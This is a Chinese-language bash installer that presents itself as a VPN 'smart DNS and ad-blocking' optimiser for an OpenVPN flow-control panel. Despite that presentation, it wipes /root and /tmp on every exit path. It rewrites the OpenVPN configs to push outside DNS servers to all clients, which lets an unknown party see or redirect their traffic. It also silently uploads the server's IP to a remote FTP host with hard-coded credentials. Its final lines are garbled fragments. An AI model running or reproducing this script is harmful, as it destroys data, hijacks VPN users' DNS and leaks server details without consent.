#!/bin/bash
chattr -a /tmp/
rm -rf /root/*  >/dev/null 2>&1
rm -rf /tmp/*  >/dev/null 2>&1
IPAddress=`curl -s ip.3322.net`;
echo
echo -e "功能说明：\033[35m小白免流智能解析优化是针对用户提供的去广告、访问谷歌服务、YouTube\n支持腾讯视频、芒果TV等影视客户端去广告功能，同时\n支持大部分网页去广告！\033[0m"
echo 
echo -e "注意：\033[35m该功能可能对部分高防服务器无效！\033[0m"
echo
echo " 请选择流控类型："
echo 
echo -e " 1 - \033[36m开启智能解析（为服务器开启智能解析服务）\033[0m" 
echo -e " 2 - \033[36m还原默认解析（恢复默认解析参数）\033[0m"
echo
echo -e " 3 - 退出"
echo
echo -n "输入选项: "
read ddns
case $ddns in
[1]|[1-3]) ;;
*) echo -e '\n ...选择错误，操作被终止';
		rm -rf /root/*  >/dev/null 2>&1
        rm -rf /tmp/*  >/dev/null 2>&1
		exit 0 ;;
esac
if [ $ddns == "1" ];then
	if [ -f "/home/llws.apk" ];then
		echo
		echo "当前流控：小羽流控"
		echo
		echo "正在执行操作..."
		if [ ! -f "/var/dup/dup " ];then
		mkdir -p /var/dup
		\cp /etc/openvpn/server.conf  /var/dup/server.conf              
		\cp /etc/openvpn/udp53.conf   /var/dup/udp53.conf               
		\cp /etc/openvpn/udp137.conf  /var/dup/udp137.conf              
		\cp /etc/openvpn/udp138.conf  /var/dup/udp138.conf              
		fi
		sed -i '/dhcp-option/d'       /var/dup/server.conf             
		sed -i '/dhcp-option/d'       /var/dup/udp53.conf               
		sed -i '/dhcp-option/d'       /var/dup/udp137.conf            
		sed -i '/dhcp-option/d'       /var/dup/udp138.conf              
		cat >>/etc/openvpn/server.conf <<EOF

push "dhcp-option DNS 221.229.175.112"
push "dhcp-option DNS 103.222.189.112"
EOF

		cat >>/etc/openvpn/udp53.conf <<EOF

push "dhcp-option DNS 221.229.175.112"
push "dhcp-option DNS 103.222.189.112"
EOF

		cat >>/etc/openvpn/udp137.conf <<EOF

push "dhcp-option DNS 221.229.175.112"
push "dhcp-option DNS 103.222.189.112"
EOF

		cat >>/etc/openvpn/udp138.conf <<EOF

push "dhcp-option DNS 221.229.175.112"
push "dhcp-option DNS 103.222.189.112"
EOF

		sleep 2
		mkdir -p /ddns
		echo "安装-开启ddns">/ddns/$IPAddress.on;curl -T /ddns/$IPAddress.on -u dns:dns ftp://103.222.189.66:21/  >/dev/null 2>&1
		
		vpn
		rm -rf /root/*  >/dev/null 2>&1
        rm -rf /tmp/*  >/dev/null 2>&1
		exit 0;
	else
		echo
		echo " 开启智能解析服务失败，请先安装小白流控再执行开启操作...."
	    rm -rf /root/*  >/dev/null 2>&1
        rm -rf /tmp/*  >/dev/null 2>&1
		exit 0;
	fi
elif [ $ddns == "2" ];then
	if [ -f "/var/dup/server.conf" ];then
	echo
	echo "正在还原默认解析..."
	sleep 1
		\cp /var/dup/server.conf  /etc/openvpn/server.conf              
		\cp /var/dup/udp53.conf   /etc/openvpn/udp53.conf               
		\cp /var/dup/udp137.conf  /etc/openvpn/udp137.conf              
		\cp /var/dup/udp138.conf  /etc/openvpn/udp138.conf   
	echo "安装-关闭ddns">/ddns/$IPAddress.off;curl -T /ddns/$IPAddress.off -u dns:dns ftp://103.222.189.66:21/  >/dev/null 2>&1
	vpn
	rm -rf /root/*  >/dev/null 2>&1
    rm -rf /tmp/*  >/dev/null 2>&1
	exit 0;
	else
	echo "当前系统尚未开启智能解析服务，无需执行恢复操作..."
	rm -rf /root/*  >/dev/null 2>&1
    rm -rf /tmp/*  >/dev/null 2>&1
	exit 0;
	fi
elif [ $ddns == "3" ];then
echo
rm -rf /root/*  >/dev/null 2>&1
rm -rf /tmp/*  >/dev/null 2>&1
exit 0;
fi
ho
rm -rf /root/*  >/dev/null 2>&1
rm -rf /tmp/*  >/dev/null 2>&1
exit 0;
fi
n
echo
rm -rf /root/*  >/dev/null 2>&1
rm -rf /tmp/*  >/dev/null 2>&1
exit 0;
fi